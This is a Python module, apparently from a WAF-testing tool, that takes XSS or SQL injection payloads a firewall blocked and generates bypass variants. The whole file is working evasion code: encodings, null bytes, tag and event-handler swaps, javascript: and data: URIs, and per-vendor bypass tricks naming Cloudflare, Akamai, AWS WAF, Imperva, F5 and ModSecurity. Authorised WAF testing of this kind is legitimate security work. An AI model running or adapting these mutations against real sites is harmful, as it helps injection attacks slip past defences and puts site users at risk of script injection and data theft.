"""Payload mutation engine — auto-generate bypass variants from blocked payloads.

Given a payload that was blocked by a WAF, generate N mutated variants using
encoding, case variation, tag substitution, whitespace injection, comment
insertion, and other evasion techniques.

Usage:
    from fray.mutator import mutate_payload
    variants = mutate_payload('<script>alert(1)</script>', max_variants=20)
"""

import html as html_mod
import random
import re
import urllib.parse
from typing import Dict, List, Optional


# ── Mutation strategies ──────────────────────────────────────────────────

def _url_encode(payload: str) -> str:
    """Single URL-encode special characters."""
    return urllib.parse.quote(payload, safe='')


def _double_url_encode(payload: str) -> str:
    """Double URL-encode special characters."""
    return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')


def _html_entity_encode(payload: str) -> str:
    """Replace key chars with HTML decimal entities."""
    mapping = {'<': '&#60;', '>': '&#62;', '"': '&#34;', "'": '&#39;',
               '(': '&#40;', ')': '&#41;', '/': '&#47;'}
    out = payload
    for ch, ent in mapping.items():
        out = out.replace(ch, ent)
    return out


def _html_hex_entity_encode(payload: str) -> str:
    """Replace key chars with HTML hex entities."""
    mapping = {'<': '&#x3c;', '>': '&#x3e;', '"': '&#x22;', "'": '&#x27;',
               '(': '&#x28;', ')': '&#x29;', '/': '&#x2f;'}
    out = payload
    for ch, ent in mapping.items():
        out = out.replace(ch, ent)
    return out


def _unicode_escape(payload: str) -> str:
    """Replace ASCII chars with fullwidth Unicode equivalents."""
    mapping = {'<': '\uff1c', '>': '\uff1e', '(': '\uff08', ')': '\uff09',
               '"': '\uff02', "'": '\uff07', '/': '\uff0f'}
    out = payload
    for ch, uni in mapping.items():
        out = out.replace(ch, uni)
    return out


def _case_swap(payload: str) -> str:
    """Randomly swap case of alphabetic characters."""
    return ''.join(
        c.upper() if random.random() > 0.5 else c.lower()
        for c in payload
    )


def _mixed_case_tags(payload: str) -> str:
    """Swap case of HTML tag names only."""
    def _swap_tag(m):
        tag = m.group(1)
        swapped = ''.join(
            c.upper() if i % 2 == 0 else c.lower()
            for i, c in enumerate(tag)
        )
        return m.group(0).replace(tag, swapped, 1)
    return re.sub(r'</?([a-zA-Z]+)', _swap_tag, payload)


def _insert_null_bytes(payload: str) -> str:
    """Insert null bytes between tag characters."""
    return payload.replace('<', '<\x00').replace('>', '\x00>')


def _insert_html_comments(payload: str) -> str:
    """Insert HTML comments inside tags to break signatures."""
    # e.g. <scr<!---->ipt> → breaks naive regex
    result = payload
    for tag in ['script', 'img', 'svg', 'iframe', 'body', 'input', 'select',
                'details', 'marquee', 'video', 'audio', 'object', 'embed']:
        if tag in result.lower():
            mid = len(tag) // 2
            broken = tag[:mid] + '<!---->' + tag[mid:]
            result = re.sub(re.escape(tag), broken, result, flags=re.IGNORECASE, count=1)
    return result


def _whitespace_injection(payload: str) -> str:
    """Insert tabs/newlines inside tags."""
    ws_chars = ['\t', '\n', '\r', '\x0c', '\x0b', ' ' * 2]
    result = payload
    # Insert between < and tag name
    result = re.sub(r'<([a-zA-Z])', lambda m: '<' + random.choice(ws_chars) + m.group(1), result, count=1)
    # Insert between attributes
    result = re.sub(r'(\w)=', lambda m: m.group(1) + random.choice(ws_chars) + '=', result, count=2)
    return result


def _newline_in_tag(payload: str) -> str:
    """Insert newlines within tag names."""
    for tag in ['script', 'onerror', 'onload', 'onclick', 'onfocus', 'alert']:
        if tag in payload.lower():
            mid = len(tag) // 2
            broken = tag[:mid] + '\n' + tag[mid:]
            payload = re.sub(re.escape(tag), broken, payload, flags=re.IGNORECASE, count=1)
            break
    return payload


_TAG_ALTERNATIVES = {
    'script': ['svg/onload', 'img/onerror', 'body/onload', 'details/ontoggle',
               'input/onfocus', 'marquee/onstart', 'video/onerror'],
    'img': ['svg', 'video', 'audio', 'input', 'object', 'embed'],
    'svg': ['math', 'img', 'body', 'details'],
}

_EVENT_ALTERNATIVES = {
    'onerror': ['onload', 'onfocus', 'onclick', 'onmouseover', 'ontoggle'],
    'onload': ['onerror', 'onfocus', 'onmouseover', 'onpageshow'],
    'onclick': ['onmouseover', 'onfocus', 'ondblclick'],
    'onfocus': ['onblur', 'oninput', 'onclick'],
}


def _tag_substitution(payload: str) -> str:
    """Replace HTML tags with alternative tags that achieve similar effect."""
    lower = payload.lower()

    # <script>X</script> → <img src=x onerror=X>
    m = re.search(r'<script[^>]*>(.*?)</script>', lower, re.DOTALL)
    if m:
        js_code = m.group(1).strip()
        alts = [
            f'<img src=x onerror={js_code}>',
            f'<svg onload={js_code}>',
            f'<body onload={js_code}>',
            f'<details open ontoggle={js_code}>',
            f'<input onfocus={js_code} autofocus>',
            f'<marquee onstart={js_code}>',
        ]
        return random.choice(alts)

    # Replace event handler
    for evt, alts in _EVENT_ALTERNATIVES.items():
        if evt in lower:
            new_evt = random.choice(alts)
            payload = re.sub(re.escape(evt), new_evt, payload, flags=re.IGNORECASE, count=1)
            # If switching to onfocus, try adding autofocus
            if new_evt == 'onfocus' and 'autofocus' not in lower:
                payload = payload.rstrip('>') + ' autofocus>'
            return payload

    return payload


def _concat_split(payload: str) -> str:
    """Split string literals using JS concatenation."""
    # alert(1) → al'+'ert(1)
    result = payload
    for fn in ['alert', 'confirm', 'prompt', 'eval']:
        if fn in result:
            mid = len(fn) // 2
            result = result.replace(fn, f"{fn[:mid]}'+'{fn[mid:]}", 1)
            break
    return result


def _backtick_substitution(payload: str) -> str:
    """Replace parentheses with backticks for function calls."""
    # alert(1) → alert`1`
    return re.sub(r'(\w+)\(([^)]*)\)', r'\1`\2`', payload, count=1)


def _svg_wrapper(payload: str) -> str:
    """Wrap payload in SVG context."""
    if '<svg' not in payload.lower():
        return f'<svg><desc>{payload}</desc></svg>'
    return payload


def _math_wrapper(payload: str) -> str:
    """Wrap payload in MathML context for parser confusion."""
    if '<math' not in payload.lower():
        return f'<math><mtext>{payload}</mtext></math>'
    return payload


def _data_uri(payload: str) -> str:
    """Convert to data: URI injection."""
    import base64
    encoded = base64.b64encode(payload.encode()).decode()
    return f'<object data="data:text/html;base64,{encoded}">'


def _javascript_uri(payload: str) -> str:
    """Convert JS code to javascript: URI."""
    # Extract JS code from common patterns
    m = re.search(r'(?:onerror|onload|onclick|onfocus)\s*=\s*(.+?)(?:\s|>|$)', payload, re.IGNORECASE)
    if m:
        js = m.group(1).strip('"\'')
        return f'<a href="javascript:{js}">click</a>'
    return payload


def _chunk_encoding_hint(payload: str) -> str:
    """Add Transfer-Encoding hint comment (for documentation)."""
    # Split payload at midpoint — suggests chunked transfer evasion
    mid = len(payload) // 2
    return f'{payload[:mid]}<!--chunk-->{payload[mid:]}'


# ── Main mutation engine ─────────────────────────────────────────────────

# All mutation functions, ordered by likelihood of success
_MUTATIONS = [
    ("mixed_case", _mixed_case_tags),
    ("url_encode", _url_encode),
    ("double_url_encode", _double_url_encode),
    ("html_entity", _html_entity_encode),
    ("html_hex_entity", _html_hex_entity_encode),
    ("unicode_fullwidth", _unicode_escape),
    ("case_swap", _case_swap),
    ("html_comment", _insert_html_comments),
    ("whitespace", _whitespace_injection),
    ("newline_in_tag", _newline_in_tag),
    ("tag_substitution", _tag_substitution),
    ("event_swap", _tag_substitution),
    ("concat_split", _concat_split),
    ("backtick", _backtick_substitution),
    ("svg_wrap", _svg_wrapper),
    ("math_wrap", _math_wrapper),
    ("data_uri", _data_uri),
    ("javascript_uri", _javascript_uri),
    ("null_byte", _insert_null_bytes),
    ("chunk_hint", _chunk_encoding_hint),
]


# ── WAF-vendor-specific mutation strategies ──────────────────────────────
# Known bypass patterns per WAF vendor, curated from real-world research.
# These are tried first when the WAF vendor is known.

_VENDOR_MUTATIONS: Dict[str, List[tuple]] = {
    "cloudflare": [
        ("cf_proto_smuggle", lambda p: p.replace("<script", "<script/x")),
        ("cf_svg_onload", lambda p: p.replace("<script>alert(1)</script>", '<svg onload="alert(1)">')),
        ("cf_double_encode", lambda p: p.replace("<", "%253C").replace(">", "%253E")),
        ("cf_javascript_uri", lambda p: f'<a href="javas\tcript:{p}">x</a>' if "alert" in p else p),
        ("cf_template_literal", lambda p: p.replace("alert(1)", "alert`1`")),
        ("cf_constructor", lambda p: p.replace("alert(1)", "[].constructor.constructor('alert(1)')()")),
    ],
    "akamai": [
        ("ak_comment_break", lambda p: p.replace("script", "scr/**/ipt")),
        ("ak_tab_bypass", lambda p: p.replace("<script>", "<script\t>")),
        ("ak_null_mid", lambda p: p[:len(p)//2] + "\x00" + p[len(p)//2:]),
        ("ak_concat_bypass", lambda p: p.replace("'", "' '") if "'" in p else p),
        ("ak_hex_encode", lambda p: "".join(f"\\x{ord(c):02x}" if not c.isalnum() else c for c in p)),
    ],
    "aws_waf": [
        ("aws_case_mix", lambda p: p.replace("SELECT", "SeLeCt").replace("UNION", "UnIoN")),
        ("aws_comment_inline", lambda p: p.replace(" ", "/*!")),
        ("aws_version_comment", lambda p: p.replace("UNION", "/*!50000UNION*/")),
        ("aws_chunk_encoding", lambda p: p.replace("script", "scr\r\nipt")),
    ],
    "imperva": [
        ("imp_hpc", lambda p: p.replace("/", "//")),
        ("imp_param_frag", lambda p: p.replace("=", "=%00")),
        ("imp_unicode_norm", lambda p: p.replace("a", "\u0430") if "alert" in p else p),  # Cyrillic а
        ("imp_multiline", lambda p: p.replace(" ", "\n")),
    ],
    "f5_bigip": [
        ("f5_url_full_encode", lambda p: "".join(f"%{ord(c):02x}" for c in p)),
        ("f5_overlong_utf8", lambda p: p.replace("<", "\xc0\xbc").replace(">", "\xc0\xbe")),
    ],
    "modsecurity": [
        ("mod_comment_nest", lambda p: p.replace("--", "-- -")),
        ("mod_charset_trick", lambda p: p.replace("'", "\xbf\x27")),  # GBK trick
        ("mod_payload_split", lambda p: p.replace("UNION SELECT", "UNION%0aSELECT")),
    ],
}


def mutate_payload(payload: str,
                   max_variants: int = 20,
                   strategies: Optional[List[str]] = None,
                   waf_vendor: Optional[str] = None) -> List[dict]:
    """Generate mutated variants of a payload.

    Args:
        payload: Original payload string that was blocked.
        max_variants: Maximum number of variants to generate.
        strategies: Optional list of strategy names to use (default: all).
        waf_vendor: Optional WAF vendor name (e.g. "cloudflare", "akamai") for
                    vendor-specific bypass mutations tried first.

    Returns:
        List of dicts: [{"payload": str, "strategy": str, "original": str}, ...]
    """
    # Build mutation list: vendor-specific first (if known), then generic
    mutations = list(_MUTATIONS)
    if waf_vendor:
        vendor_key = waf_vendor.lower().replace(" ", "_").split("(")[0].strip("_")
        vendor_muts = _VENDOR_MUTATIONS.get(vendor_key, [])
        if not vendor_muts:
            for vk, vm in _VENDOR_MUTATIONS.items():
                if vk in vendor_key or vendor_key in vk:
                    vendor_muts = vm
                    break
        if vendor_muts:
            mutations = vendor_muts + mutations

    if strategies:
        strategy_set = set(strategies)
        mutations = [(name, fn) for name, fn in mutations if name in strategy_set]

    variants = []
    seen = {payload}  # Deduplicate

    for name, fn in mutations:
        if len(variants) >= max_variants:
            break
        try:
            mutated = fn(payload)
            if mutated and mutated not in seen and mutated != payload:
                seen.add(mutated)
                variants.append({
                    "payload": mutated,
                    "strategy": name,
                    "original": payload,
                })
        except Exception:
            continue

    # If we haven't hit max, try compound mutations (apply 2 strategies)
    if len(variants) < max_variants:
        base_variants = list(variants)
        for v in base_variants:
            if len(variants) >= max_variants:
                break
            for name, fn in mutations[:10]:
                if len(variants) >= max_variants:
                    break
                try:
                    compound = fn(v["payload"])
                    if compound and compound not in seen:
                        seen.add(compound)
                        variants.append({
                            "payload": compound,
                            "strategy": f"{v['strategy']}+{name}",
                            "original": payload,
                        })
                except Exception:
                    continue

    return variants[:max_variants]


def mutate_blocked_results(results: List[dict],
                           max_per_payload: int = 10) -> List[dict]:
    """Take test results and generate mutations for all blocked payloads.

    Args:
        results: List of test result dicts (from WAFTester.test_payloads).
        max_per_payload: Max mutations per blocked payload.

    Returns:
        List of mutation dicts ready for re-testing.
    """
    all_mutations = []
    for r in results:
        if r.get('blocked', False):
            original = r.get('payload', '')
            if original:
                mutations = mutate_payload(original, max_variants=max_per_payload)
                all_mutations.extend(mutations)
    return all_mutations
